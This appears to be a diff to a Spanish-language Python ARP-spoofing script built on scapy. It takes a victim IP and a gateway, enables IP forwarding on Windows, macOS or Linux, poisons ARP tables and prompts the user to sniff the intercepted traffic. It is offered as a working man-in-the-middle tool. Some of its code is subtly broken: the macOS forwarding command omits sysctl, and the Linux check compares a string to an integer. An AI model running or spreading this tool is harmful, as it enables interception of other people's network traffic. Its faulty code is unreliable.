@@ -1,27 +1,41 @@
-import sys
+#!/usr/bin/python3
+import platform
 import argparse
 import os
 import scapy.all as scapy
 from scapy.all import srp,send,ARP
 import time
-def enable_disable_linux_route():
+def enable_ip_forwarding_mac():
+        os.system("net.inet.ip.forwarding=1")
+def enable_linux_route():
+
         path = '/proc/sys/net/ipv4/ip_forward'
         with open(path) as f:
                 if f.read() == 1:
                         return
         with open(path, "w") as f:
                 print(1, file=f)
+                
 def enable_windows_iprouter():
         from services import WService
         servicio = WService("RemoteAcess")
         servicio.start()
 def control_de_forwarding(verbose=True):
-        if verbose:
-                print ("[!] Habilitando Routing IP ")
-        enable_windows_iprouter() if "nt" in os.name else enable_disable_linux_route()
-        if verbose:
-                print ("Routing IP habilitado para su host")
 
+                if verbose:
+                        print ("[!] Habilitando Routing IP ")
+                if platform.system() == "Windows":
+                        enable_windows_iprouter()
+                elif platform.system() == "Darwin":
+                        enable_ip_forwarding_mac()
+                else:
+                        enable_linux_route()
+
+                #enable_windows_iprouter() if "nt" in os.name 
+                 #                               else enable_disable_linux_route()
+                if verbose:
+                        print ("Routing IP habilitado para su host")
+  
 def fallo():
     
         print ("La maquina victima no esta generando trafico")
@@ -59,6 +73,7 @@ def restaurartablas(ip_destino, ip_origen,iface):
 
 #print ("Ejecuta el programa de la siguiente manera poniendo como primer argumento la ip victima y como segundo la ip de la puerta de enlace o gateway de su red: sudo python3 arpspoofing.py 192.168.0.10 192.168.1.1")
 if __name__ == '__main__':
+        print("EJECUTAR SCRIPT COMO ROOT SI NO DARA ERROR")
         parser = argparse.ArgumentParser(description="arpspoofing by luijait")
         parser.add_argument("ip_objetivo", help="Host Victima")
         parser.add_argument("gateway_ip", help="Gateway")
@@ -78,7 +93,7 @@ if __name__ == '__main__':
 
                         paquetes_enviados = paquetes_enviados + 2
 
-                        print("\r[*]Se esta arpeando el objetivo... ahora use su sniffer la cantidad de paquetes enviados son:" +str(paquetes_enviados), end="")
+                        print("\r[!]Se esta arpeando el objetivo... ahora use su sniffer la cantidad de paquetes enviados son:" +str(paquetes_enviados)+ "", end="")
 
                         time.sleep(2)
           
@@ -93,3 +108,4 @@ if __name__ == '__main__':
                 restaurartablas(gateway_ip, ip_objetivo,iface)
                 restaurartablas(ip_objetivo, gateway_ip,iface)
                 print("Ha salido del programa")
+        
